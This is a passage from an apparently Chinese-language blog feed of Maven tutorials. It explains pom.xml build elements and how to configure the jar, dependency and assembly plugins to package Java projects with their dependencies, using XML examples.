class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre></div><ul><li><strong>configuration</strong></li></ul><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">appendAssemblyId</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">appendAssemblyId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">descriptorRefs</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">descriptorRef</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">descriptorRefs</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">classpathPrefix</span>&gt;</span>lib/<span class="hljs-tag">&lt;/<span class="hljs-name">classpathPrefix</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre></div><ul><li><strong>executions</strong></li></ul><p><code>executions</code>元素用于指定插件执行的生命周期绑定和执行顺序。每个<code>execution</code>元素定义了一个插件执行的阶段（phase）和目标（goal），以及可选的其他配置</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>default-compile<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>default-testCompile<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>  //execution的ID<span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>test-compile<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span>  //指定插件执行的阶段<span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>testCompile<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span>   //指定插件执行的目标<span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>  //插件的其他配置<span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span></code></pre></div><ul><li><strong>dependencies</strong></li></ul><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div><ul><li>goals</li></ul><div class="code-wrapper"><pre><code class="hljs xml"></code></pre></div><h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">targetPath</span>&gt;</span>META-INF/plexus<span class="hljs-tag">&lt;/<span class="hljs-name">targetPath</span>&gt;</span>   //指定资源打包后存储的路径    <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>$&#123;basedir&#125;/src/main/plexus<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>   //指定项目需要打包的资源文件路径    <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>configuration.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>       //指定需要打包的文件    <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span>             //排除需要打包的文件    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span></code></pre></div><h3 id="pluginManagement"><a href="#pluginManagement" class="headerlink" title="pluginManagement"></a>pluginManagement</h3><h2 id="reporting"><a href="#reporting" class="headerlink" title="reporting"></a>reporting</h2><div class="code-wrapper"><pre><code class="hljs xml">包括项目的报告输出目录配置、报告插件配置等信息</code></pre></div><h2 id="项目信息设置"><a href="#项目信息设置" class="headerlink" title="项目信息设置"></a>项目信息设置</h2><p><code>&lt;name&gt;</code>：项目的名称</p><p><code>&lt;url&gt;</code>：项目的url地址</p><p><code>&lt;description&gt;</code>：项目的描述信息<br><code>&lt;licenses&gt;&lt;organization&gt;&lt;developers&gt;</code>：项目的开发者信息<br><code>&lt;contributors&gt;</code>：项目的贡献者信息</p><div class="code-wrapper"><pre><code class="hljs bnf"><span class="hljs-attribute">&lt;name&gt;</span>testJNDI<span class="hljs-attribute">&lt;/name&gt;</span><span class="hljs-attribute">&lt;url&gt;</span><span class="hljs-attribute">&lt;http://xxxx.com&gt;</span><span class="hljs-attribute">&lt;/url&gt;</span><span class="hljs-attribute">&lt;description&gt;</span>test<span class="hljs-attribute">&lt;/description&gt;</span></code></pre></div><h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><p><code>&lt;issueManagement&gt;</code>：项目的缺陷跟踪系统信息<br><code>&lt;ciManagement&gt;</code>：项目的持续集成系统信息<br><code>&lt;mailingLists&gt;</code>：项目的邮件列表信息<br><code>&lt;scm&gt;</code>：项目的版本控制系统信息<br><code>&lt;prerequisites&gt;&lt;repositories&gt;&lt;pluginRepositories&gt;&lt;distributionManagement&gt;</code>：项目的奋发配置信息<br><code>&lt;profiles&gt;</code></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://maven.apache.org/pom.html">https://maven.apache.org/pom.html</a></p>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Maven</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打包插件</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Maven/%E6%89%93%E5%8C%85%E6%8F%92%E4%BB%B6/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Maven/%E6%89%93%E5%8C%85%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="maven-jar-plugin-maven-dependency-plugin"><a href="#maven-jar-plugin-maven-dependency-plugin" class="headerlink" title="maven-jar-plugin&amp;&amp;maven-dependency-plugin"></a>maven-jar-plugin&amp;&amp;maven-dependency-plugin</h1><h2 id="打包效果"><a href="#打包效果" class="headerlink" title="打包效果"></a>打包效果</h2><p>生成一个jar文件和lib目录。将项目java文件和相关maven文件打成jar包，再把项目所有jar文件复制到构建目录的lib文件夹下</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230315164251688.png" alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230315164251688.png"></p><h2 id="插件地址"><a href="#插件地址" class="headerlink" title="插件地址"></a>插件地址</h2><div class="code-wrapper"><pre><code class="hljs xml">https://mvnrepository.com/artifact/org.apache.maven.plugins/maven-jar-plugin/https://mvnrepository.com/artifact/org.apache.maven.plugins/maven-dependency-plugin</code></pre></div><p><strong>maven-jar-plugin</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.xxg.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span>           //在MANIFEST.MF文件中指定Main-Class<span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span>             //在MANIFEST.MF开启自动配置Class-Path属性<span class="hljs-tag">&lt;<span class="hljs-name">classpathPrefix</span>&gt;</span>lib/<span class="hljs-tag">&lt;/<span class="hljs-name">classpathPrefix</span>&gt;</span>       //指定MANIFEST.MF文件中classpath属性值的前缀<span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span></code></pre></div><p><strong>maven-dependency-plugin</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">outputDirectory</span>&gt;</span>/lib<span class="hljs-tag">&lt;/<span class="hljs-name">outputDirectory</span>&gt;</span>  //将当前项目的依赖文件打包后复制到指定目录</code></pre></div><p>两者需配合使用</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="mvn-package"><a href="#mvn-package" class="headerlink" title="mvn package"></a>mvn package</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span>           //开启类路径<span class="hljs-tag">&lt;<span class="hljs-name">classpathPrefix</span>&gt;</span>lib/<span class="hljs-tag">&lt;/<span class="hljs-name">classpathPrefix</span>&gt;</span>     //指定项目的类路径<span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.pacemrc.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span>     //指定程序的主入口<span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>copy-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>copy-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="hljs-tag">&lt;/<span class="hljs-name">outputDirectory</span>&gt;</span>  //将依赖文件复制到项目的指定目录<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h3 id="将本地库的依赖包一起打包"><a href="#将本地库的依赖包一起打包" class="headerlink" title="将本地库的依赖包一起打包"></a>将本地库的依赖包一起打包</h3><ol><li>将本地库的jar包范围设置为system</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.pacemrc.jar3<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jar1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;project.basedir&#125;/lib/jar1.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><ol><li>配置插件</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span>           //开启类路径<span class="hljs-tag">&lt;<span class="hljs-name">classpathPrefix</span>&gt;</span>lib/<span class="hljs-tag">&lt;/<span class="hljs-name">classpathPrefix</span>&gt;</span>     //指定项目的类路径<span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.pacemrc.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span>     //指定程序的主入口<span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>copy-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>copy-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="hljs-tag">&lt;/<span class="hljs-name">outputDirectory</span>&gt;</span>  //将依赖文件复制到项目的指定目录<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h1 id="maven-assembly-plugin"><a href="#maven-assembly-plugin" class="headerlink" title="maven-assembly-plugin"></a>maven-assembly-plugin</h1><h2 id="打包效果-1"><a href="#打包效果-1" class="headerlink" title="打包效果"></a>打包效果</h2><h2 id="插件地址-1"><a href="#插件地址-1" class="headerlink" title="插件地址"></a>插件地址</h2><div class="code-wrapper"><pre><code class="hljs xml">https://mvnrepository.com/artifact/org.apache.maven.plugins/maven-assembly-plugin</code></pre></div><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><h3 id="mvn-package-1"><a href="#mvn-package-1" class="headerlink" title="mvn package"></a>mvn package</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">appendAssemblyId</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">appendAssemblyId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">descriptorRefs</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">descriptorRef</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">descriptorRefs</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>org.example.Application<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>make-assembly<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>single<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h3 id="mvn-package-assembly-single"><a href="#mvn-package-assembly-single" class="headerlink" title="mvn package assembly:single"></a>mvn package assembly:single</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.xxg.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">descriptorRefs</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">descriptorRef</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">descriptorRefs</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre></div><h3 id="将本地lib库的jar包一起打包"><a href="#将本地lib库的jar包一起打包" class="headerlink" title="将本地lib库的jar包一起打包"></a>将本地lib库的jar包一起打包</h3><ol><li>将本地jar包的scope设置为system</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jar2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;project.basedir&#125;/lib/jar2.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><ol><li>配置assembly插件</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">appendAssemblyId</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">appendAssemblyId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>org.example.Application<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Class-Path</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">Class-Path</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span 